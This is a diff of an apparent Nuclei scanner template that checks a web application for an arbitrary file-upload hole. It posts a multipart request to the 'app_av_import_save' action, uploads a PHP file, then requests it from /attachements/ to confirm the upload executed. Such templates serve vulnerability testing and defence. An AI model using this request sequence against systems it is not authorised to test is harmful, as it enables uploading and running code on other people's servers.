@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: ws-fw-app_av_import_save-fileupload
 
 info:
@@ -13,9 +14,9 @@ info:
 
 http:
   - raw:
-      - |              
+      - |
         POST / HTTP/1.1
-        Host: 
+        Host:
         Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
         User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
 
@@ -34,17 +35,17 @@ http:
         app_av_import_save
         ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
 
-      - |              
+      - |
         GET /attachements/{{filename}} HTTP/1.1
-        Host: 
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15      
+        Host:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
 
     payloads:
       filename:
         - "qwqer21.php"
-               
-    matchers:     
+
+    matchers:
       - type: dsl
         name: filename
         dsl:
-          - "status_code_2 == 200 && contains(body,'9996535e07258a7bbfd8b132435c5962') && contains(header,'text/html')" 
+          - "status_code_2 == 200 && contains(body,'9996535e07258a7bbfd8b132435c5962') && contains(header,'text/html')"
